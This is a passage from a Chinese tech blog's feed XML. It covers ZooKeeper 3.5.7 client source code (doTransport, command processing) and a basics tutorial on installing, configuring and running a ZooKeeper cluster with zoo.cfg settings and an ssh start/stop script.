class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + alt +B 查找 doTransport 实现类，ClientCnxnSocketNIO.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doTransport</span><span class="params">(<span class="keyword">int</span> waitTimeOut, List&lt;Packet&gt; pendingQueue, ClientCnxn cnxn)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    selector.select(waitTimeOut);</span><br><span class="line">    Set&lt;SelectionKey&gt; selected;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        selected = selector.selectedKeys();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Everything below and until we get back to the select is</span></span><br><span class="line">    <span class="comment">// non blocking, so time is effectively a constant. That is</span></span><br><span class="line">    <span class="comment">// Why we just have to do this once, here</span></span><br><span class="line">    updateNow();</span><br><span class="line">    <span class="keyword">for</span> (SelectionKey k : selected) &#123;</span><br><span class="line">        SocketChannel sc = ((SocketChannel) k.channel());</span><br><span class="line">        <span class="keyword">if</span> ((k.readyOps() &amp; SelectionKey.OP_CONNECT) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc.finishConnect()) &#123;</span><br><span class="line">                updateLastSendAndHeard();</span><br><span class="line">                updateSocketAddresses();</span><br><span class="line">                sendThread.primeConnection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((k.readyOps() &amp; (SelectionKey.OP_READ | SelectionKey.OP_WRITE)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 读取服务端应答</span></span><br><span class="line">            doIO(pendingQueue, cnxn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sendThread.getZkState().isConnected()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (findSendablePacket(outgoingQueue,</span><br><span class="line">                sendThread.tunnelAuthInProgress()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            enableWrite();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    selected.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-5-执行-run">7.5 执行 run()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException</span>&#123;</span><br><span class="line">    ZooKeeperMain main = <span class="keyword">new</span> ZooKeeperMain(args);</span><br><span class="line">    main.run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">if</span> (jlinemissing) &#123;</span><br><span class="line">            System.out.println(<span class="string">"JLine support is disabled"</span>);</span><br><span class="line">            BufferedReader br =</span><br><span class="line">                <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 一行一行读取命令</span></span><br><span class="line">                executeLine(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Command line args non-null.  Run what was passed.</span></span><br><span class="line">        processCmd(cl);</span><br><span class="line">    &#125;</span><br><span class="line">    System.exit(exitCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeLine</span><span class="params">(String line)</span> <span class="keyword">throws</span> CliException, InterruptedException, IOException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!line.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">    cl.parseCommand(line);</span><br><span class="line">    addToHistory(commandCount,line);</span><br><span class="line">    <span class="comment">// 处理客户端命令</span></span><br><span class="line">    processCmd(cl);</span><br><span class="line">    commandCount++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">processCmd</span><span class="params">(MyCommandOptions co)</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> watch = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解析命令</span></span><br><span class="line">        watch = processZKCmd(co);</span><br><span class="line">        exitCode = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CliException ex) &#123;</span><br><span class="line">        exitCode = ex.getExitCode();</span><br><span class="line">        System.err.println(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> watch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">processZKCmd</span><span class="params">(MyCommandOptions co)</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException </span>&#123;</span><br><span class="line">    String[] args = co.getArgArray();</span><br><span class="line">    String cmd = co.getCommand();</span><br><span class="line">    <span class="keyword">if</span> (args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedCommandException(<span class="string">"No command entered"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!commandMap.containsKey(cmd)) &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> CommandNotFoundException(<span class="string">"Command not found "</span> + cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">boolean</span> watch = <span class="keyword">false</span>;</span><br><span class="line">    LOG.debug(<span class="string">"Processing "</span> + cmd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmd.equals(<span class="string">"quit"</span>)) &#123;</span><br><span class="line">        zk.close();</span><br><span class="line">        System.exit(exitCode);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"redo"</span>) &amp;&amp; args.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        Integer i = Integer.decode(args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (commandCount &lt;= i || i &lt; <span class="number">0</span>) &#123; <span class="comment">// don't allow redoing this redo</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedCommandException(<span class="string">"Command index out of range"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        cl.parseCommand(history.get(i));</span><br><span class="line">        <span class="keyword">if</span> (cl.getCommand().equals(<span class="string">"redo"</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedCommandException(<span class="string">"No redoing redos"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        history.put(commandCount, history.get(i));</span><br><span class="line">        processCmd(cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"history"</span>)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = commandCount - <span class="number">10</span>; i &lt;= commandCount; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            System.out.println(i + <span class="string">" - "</span> + history.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"printwatches"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"printwatches is "</span> + (printWatches ? <span class="string">"on"</span> : <span class="string">"off"</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            printWatches = args[<span class="number">1</span>].equals(<span class="string">"on"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.equals(<span class="string">"connect"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">            connectToZK(args[<span class="number">1</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            connectToZK(host);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Below commands all need a live connection</span></span><br><span class="line">    <span class="keyword">if</span> (zk == <span class="keyword">null</span> || !zk.getState().isAlive()) &#123;</span><br><span class="line">        System.out.println(<span class="string">"Not connected"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// execute from commandMap</span></span><br><span class="line">    CliCommand cliCmd = commandMapCli.get(cmd);</span><br><span class="line">    <span class="keyword">if</span>(cliCmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">        cliCmd.setZk(zk);</span><br><span class="line">        watch = cliCmd.parse(args).exec();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!commandMap.containsKey(cmd)) &#123;</span><br><span class="line">         usage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> watch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Zookeeper3.5.7源码分析&lt;/h1&gt;
&lt;h1&gt;一、Zookeeper算法一致性&lt;/h1&gt;
&lt;h2 id=&quot;1、Paxos-算法&quot;&gt;1、Paxos 算法&lt;/h2&gt;
&lt;h3 id=&quot;1-1-概述&quot;&gt;1.1 概述&lt;/h3&gt;
&lt;p&gt;Paxos算法：一种基于消息传递且具有高度容错特性的一致性算法。Paxos算法解决的问题：就是如何快速正确的在一个分布式系统中对某个数据值达成一致，并且保证不论发生任何异常，都不会破坏整个系统的一致性。&lt;/p&gt;
&lt;p&gt;在一个Paxos系统中，首先将所有节点划分为Proposer（提议者），Acceptor（接受者），和Learner（学习者）。（注意：每个节点都可以身兼数职），一个完整的Paxos算法流程分为三个阶段：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Prepare准备阶段&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Proposer向多个Acceptor发出Propose请求Promise（承诺）&lt;/li&gt;
&lt;li&gt;Acceptor针对收到的Propose请求进行Promise（承诺）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Accept接受阶段&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Proposer收到多数Acceptor承诺的Promise后，向Acceptor发出Propose请求&lt;/li&gt;
&lt;li&gt;Acceptor针对收到的Propose请求进行Accept处理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Learn学习阶段&lt;/strong&gt;：Proposer将形成的决议发送给所有Learners&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Zookeeper3.5.7基础学习</title>
    <link href="https://blog.shawncoding.top/posts/15b652da.html"/>
    <id>https://blog.shawncoding.top/posts/15b652da.html</id>
    <published>2024-02-06T07:04:40.000Z</published>
    <updated>2024-02-29T12:07:23.441Z</updated>
    
    <content type="html"><![CDATA[<h1>Zookeeper3.5.7基础学习</h1><h1>一、Zookeeper入门</h1><blockquote><p>官网：<a href="https://zookeeper.apache.org/" target="_blank" rel="noopener" title="https://zookeeper.apache.org/">https://zookeeper.apache.org/</a></p></blockquote><h2 id="1、概述">1、概述</h2><blockquote><p>Zookeeper 是一个开源的分布式的，为分布式框架提供协调服务的 Apache 项目</p></blockquote><p>Zookeeper从设计模式角度来理解：是一个基于观察者模式设计的分布式服务管理框架，它<strong>负责存储和管理大家都关心的数据</strong>，然后接受观察者的注册，一旦这些数据的状态发生变化，Zookeeper就将负责通知已经在Zookeeper上注册的那些观察者做出相应的反应**。Zookeeper=文件系统+通知机制**</p><a id="more"></a><h2 id="2、特点">2、特点</h2><ul><li>Zookeeper：一个领导者（Leader），多个跟随者（Follower）组成的集群</li><li>集群中只要有<strong>半数以上</strong>节点存活，Zookeeper集群就能正常服务。所以Zookeeper适合安装奇数台服务器</li><li>全局数据一致：每个Server保存一份相同的数据副本，Client无论连接到哪个Server，数据都是一致的</li><li>更新请求顺序执行，来自同一个Client的更新请求按其发送顺序依次执行</li><li>数据更新原子性，一次数据更新要么成功，要么失败</li><li>实时性，在一定时间范围内，Client能读到最新数据</li></ul><h2 id="3、数据结构">3、数据结构</h2><p>ZooKeeper 数据模型的结构与 <strong>Unix 文件系统很类似</strong>，整体上可以看作是一棵树，每个节点称做一个 ZNode。每一个 ZNode <strong>默认能够存储 1MB 的数据</strong>，每个 ZNode 都可以通过其路径唯一标识</p><h2 id="4、应用场景">4、应用场景</h2><p>提供的服务包括：统一命名服务、统一配置管理、统一集群管理、服务器节点动态上下线、软负载均衡等</p><ul><li><strong>统一命名服务</strong></li></ul><p>在分布式环境下，经常需要对应用/服务进行统一命名，便于识别。例如：IP不容易记住，而域名容易记住</p><ul><li><strong>统一配置管理</strong></li></ul><p>分布式环境下，配置文件同步非常常见。一般要求一个集群中，所有节点的配置信息是一致的，比如 Kafka 集群。对配置文件修改后，希望能够快速同步到各个节点上。配置管理可交由ZooKeeper实现。可将配置信息写入ZooKeeper上的一个Znode；各个客户端服务器监听这个Znode；一旦Znode中的数据被修改，ZooKeeper将通知各个客户端服务器。</p><ul><li><strong>统一集群管理</strong></li></ul><p>分布式环境中，实时掌握每个节点的状态是必要的。可根据节点实时状态做出一些调整。ZooKeeper可以实现实时监控节点状态变化可将节点信息写入ZooKeeper上的一个ZNode。监听这个ZNode可获取它的实时状态变化。</p><ul><li><strong>服务器动态上下线</strong></li></ul><p>客户端能实时洞察到服务器上下线的变化</p><ul><li><strong>软负载均衡</strong></li></ul><p>在Zookeeper中记录每台服务器的访问数，让访问数最少的服务器去处理最新的客户端请求</p><h1>二、Zookeeper 安装部署</h1><h2 id="1、本地模式安装">1、本地模式安装</h2><h3 id="1-1-基础操作">1.1 基础操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先自行安装jdk，这里我就继续在之前的hadoop集群上继续操作了</span></span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/apache-zookeeper-3.5.7-bin.tar.gz</span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============配置修改=============</span></span><br><span class="line"><span class="comment"># 将/opt/module/zookeeper-3.5.7/conf 这个路径下的 zoo_sample.cfg 修改为 zoo.cfg</span></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line"><span class="comment"># 打开 zoo.cfg 文件，修改 dataDir 路径</span></span><br><span class="line">vim zoo.cfg</span><br><span class="line"><span class="comment"># 修改如下内容</span></span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="comment"># 在/opt/module/zookeeper-3.5.7/这个目录上创建 zkData 文件夹</span></span><br><span class="line">mkdir zkData</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============操作 Zookeeper============</span></span><br><span class="line"><span class="comment"># 启动 Zookeeper</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="comment"># 查看进程是否启动</span></span><br><span class="line">jps</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">bin/zkServer.sh status</span><br><span class="line"><span class="comment"># 启动客户端</span></span><br><span class="line">bin/zkCli.sh</span><br><span class="line">quit</span><br><span class="line"><span class="comment"># 停止 Zookeeper</span></span><br><span class="line">bin/zkServer.sh stop</span><br></pre></td></tr></table></figure><h3 id="1-2-配置参数解读">1.2 配置参数解读</h3><p><code>vim zoo.cfg</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通信心跳时间，Zookeeper服务器与客户端心跳时间，单位毫秒</span></span><br><span class="line">tickTime=2000</span><br><span class="line"><span class="comment"># LF初始通信时限,Leader和Follower初始连接时能容忍的最多心跳数（tickTime的数量）</span></span><br><span class="line"><span class="comment"># 指定了Zookeeper集合中的Follower节点（从节点）在连接到Leader节点（主节点）时能够等待的时间量。在这个时间范围内，如果从节点不能连接到Leader节点，则从节点将放弃连接尝试</span></span><br><span class="line">initLimit=10</span><br><span class="line"><span class="comment"># LF同步通信时限</span></span><br><span class="line"><span class="comment"># Leader和Follower之间通信时间如果超过syncLimit * tickTime，Leader认为Follwer死掉，从服务器列表中删除Follwer</span></span><br><span class="line">syncLimit=5</span><br><span class="line"><span class="comment"># 保存Zookeeper中的数据</span></span><br><span class="line"><span class="comment"># 注意：默认的tmp目录，容易被Linux系统定期删除，所以一般不用默认的tmp目录。</span></span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="comment"># 客户端连接端口，通常不做修改</span></span><br><span class="line">clientPort=2181</span><br></pre></td></tr></table></figure><h2 id="2、集群部署">2、集群部署</h2><h3 id="2-1-集群安装">2.1 集群安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 hadoop102、hadoop103 和 hadoop104 三个节点上都部署 Zookeeper（这是之前hadoop集群用的）</span></span><br><span class="line"><span class="comment"># 在 hadoop102 解压 Zookeeper 安装包到/opt/module/目录下</span></span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============配置修改=============</span></span><br><span class="line"><span class="comment"># 在/opt/module/zookeeper-3.5.7/这个目录上创建 zkData 文件夹</span></span><br><span class="line">mkdir zkData</span><br><span class="line"><span class="comment"># 在/opt/module/zookeeper-3.5.7/zkData 目录下创建一个 myid 的文件</span></span><br><span class="line"><span class="comment"># 在文件中添加与 server 对应的编号（注意：上下不要有空行，左右不要有空格）</span></span><br><span class="line"><span class="comment"># 这里编写一个2，注意：添加 myid 文件，一定要在 Linux 里面创建，在 notepad++里面很可能乱码</span></span><br><span class="line">vi myid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置好的 zookeeper 到其他机器上，分发脚本可以想见之前hadooop3.x学习笔记文章</span></span><br><span class="line">xsync zookeeper-3.5.7</span><br><span class="line"><span class="comment"># 并分别在 hadoop103、hadoop104 上修改 myid 文件中内容为 3、4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============配置zoo.cfg文件============</span></span><br><span class="line"><span class="comment"># 重命名/opt/module/zookeeper-3.5.7/conf 这个目录下的 zoo_sample.cfg 为 zoo.cfg</span></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">vim zoo.cfg</span><br><span class="line"><span class="comment"># 修改数据存储路径配置</span></span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="comment"># 增加如下配置</span></span><br><span class="line"><span class="comment">#######################cluster##########################</span></span><br><span class="line">server.2=hadoop102:2888:3888</span><br><span class="line">server.3=hadoop103:2888:3888</span><br><span class="line">server.4=hadoop104:2888:3888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置参数解读</span></span><br><span class="line"><span class="comment"># server.A=B:C:D</span></span><br><span class="line"><span class="comment"># A 是一个数字，表示这个是第几号服务器；集群模式下配置一个文件myid，这个文件在 dataDir 目录下，这个文件里面有一个数据就是 A 的值，</span></span><br><span class="line"><span class="comment"># Zookeeper 启动时读取此文件，拿到里面的数据与 zoo.cfg 里面的配置信息比较从而判断到底是哪个 server。</span></span><br><span class="line"><span class="comment"># B 是这个服务器的地址；</span></span><br><span class="line"><span class="comment"># C 是这个服务器Follower 与集群中的 Leader 服务器交换信息的端口；</span></span><br><span class="line"><span class="comment"># D 是万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的Leader，而这个端口就是用来执行选举时服务器相互通信的端口。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步zoo.cfg 配置文件</span></span><br><span class="line">xsync zoo.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================集群操作====================</span></span><br><span class="line"><span class="comment"># 分别三台机器启动Zookeeper</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">bin/zkServer.sh status</span><br></pre></td></tr></table></figure><h3 id="2-2-选举机制-面试重点">2.2 选举机制(面试重点)</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817886.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817887.png" alt></p><h3 id="2-3-ZK-集群启动停止脚本">2.3 ZK 集群启动停止脚本</h3><p>在 hadoop102 的/home/atguigu/bin 目录下创建脚本： <code>vim zk.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> ---------- zookeeper <span class="variable">$i</span> 启动 ------------</span><br><span class="line">  ssh <span class="variable">$i</span> <span class="string">"/opt/module/zookeeper-3.5.7/bin/zkServer.sh start"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"stop"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> ---------- zookeeper <span class="variable">$i</span> 停止 ------------ </span><br><span class="line">  ssh <span class="variable">$i</span> <span class="string">"/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"status"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> ---------- zookeeper <span class="variable">$i</span> 状态 ------------ </span><br><span class="line">  ssh <span class="variable">$i</span> <span class="string">"/opt/module/zookeeper-3.5.7/bin/zkServer.sh status"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 